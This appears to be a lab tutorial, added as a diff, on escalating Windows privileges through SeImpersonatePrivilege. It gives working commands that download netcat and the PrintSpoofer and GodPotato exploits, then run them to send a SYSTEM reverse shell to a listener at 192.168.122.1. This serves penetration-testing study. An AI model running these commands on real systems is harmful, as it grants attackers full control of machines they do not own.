@@ -1,0 +1,163 @@
+                 _____________________________________
+
+                      WINDOWS PRIVILEGE ESCALATION
+                  SeImpersonatePrivilege Exploitation
+
+                            Leonardo Tamiano
+                 _____________________________________
+
+
+Table of Contents
+_________________
+
+1. Windows Setup
+2. SeImpersonatePrivilege
+3. Exploitation
+4. References
+
+
+1 Windows Setup
+===============
+
+  Assign the `SeImpersonatePrivilege' to the new user
+  ,----
+  | Go to "Edit group policy"
+  |   -> Computer Configuration
+  |   -> Windows Settings
+  |   -> Security Settings
+  |   -> Local Policies
+  |   -> User Rights Assignment
+  |   -> Impersonate a client after authentication
+  |   -> Right click and "Properties"
+  |   -> Add user or group.
+  `----
+
+
+2 SeImpersonatePrivilege
+========================
+
+  When you assign the "Impersonate a client after authentication" user
+  right to a user, you permit programs that run on behalf of that user
+  to impersonate a client.
+
+  An attacker with SeImpersonatePrivilege could create a service,
+  mislead a client into connecting to the service, and then impersonate
+  that computer to elevate the attacker's level of access to that of the
+  device.
+
+
+3 Exploitation
+==============
+
+  Check we have the right privilege
+  ,----
+  | PS C:\Users\leonardo> whoami /priv
+  | 
+  | PRIVILEGES INFORMATION
+  | ----------------------
+  | 
+  | Privilege Name                Description                               State
+  | ============================= ========================================= ========
+  | SeShutdownPrivilege           Shut down the system                      Disabled
+  | SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled
+  | SeUndockPrivilege             Remove computer from docking station      Disabled
+  | SeImpersonatePrivilege        Impersonate a client after authentication Enabled
+  | SeIncreaseWorkingSetPrivilege Increase a process working set            Disabled
+  | SeTimeZonePrivilege           Change the time zone                      Disabled
+  `----
+
+  Various exploits can be used:
+
+  - PrintSpoofer
+  - GodPotato
+
+  In all cases, we first have to start up a local listener
+
+  ,----
+  | (local) nc -lvnp 5555
+  `----
+
+  Download ncat in remote machine
+  ,----
+  | (windows) iwr -uri "https://raw.githubusercontent.com/int0x33/nc.exe/master/nc64.exe" -Outfile nc64.exe
+  `----
+
+  ----------------------------------------------------------------------
+
+  *PrintSpoofer*
+
+  Download exploit
+  ,----
+  | (windows) iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe" -Outfile PrintSpoofer32.exe
+  | (windows) iwr -uri "https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe" -Outfile PrintSpoofer64.exe
+  `----
+
+  Execute exploit
+  ,----
+  | (windows) PrintSpoofer64.exe -c "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
+  `----
+
+  ----------------------------------------------------------------------
+
+  Understand the version of .NET with the following command and used the
+  relative exploit.
+
+  ,----
+  | reg query "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\NET Framework Setup\NDP"
+  `----
+
+  *GodPotato-NET2*
+
+  Download exploit
+  ,----
+  | (windows) iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET2.exe" -Outfile GodPotato-NET2.exe
+  `----
+
+  Execute exploit
+  ,----
+  | (windows) .\GodPotato-NET2.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
+  `----
+
+  ----------------------------------------------------------------------
+
+  *GodPotato-NET35*
+
+  Download exploit
+  ,----
+  | (windows) iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET35.exe" -Outfile GodPotato-NET35.exe
+  `----
+
+  Execute exploit
+  ,----
+  | (windows) .\GodPotato-NET35.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
+  `----
+
+  ----------------------------------------------------------------------
+
+  *GodPotato-NET4*
+
+  Download exploit
+  ,----
+  | (windows) iwr -uri "https://github.com/BeichenDream/GodPotato/releases/download/V1.20/GodPotato-NET4.exe" -Outfile GodPotato-NET4.exe
+  `----
+
+  Execute exploit
+  ,----
+  | (windows) .\GodPotato-NET4.exe -cmd "C:\Users\leonardo\Desktop\nc64.exe 192.168.122.1 5555 -e cmd"
+  `----
+
+
+4 References
+============
+
+  on SeImpersonatePrivilege
+  - <https://learn.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege>
+  - <https://juggernaut-sec.com/seimpersonateprivilege/>
+  - <https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/>
+
+  PrintSpoofer exploit
+  - <https://github.com/itm4n/PrintSpoofer>
+  - <https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe>
+
+  GodPotato exploit
+  - <https://github.com/BeichenDream/GodPotato>
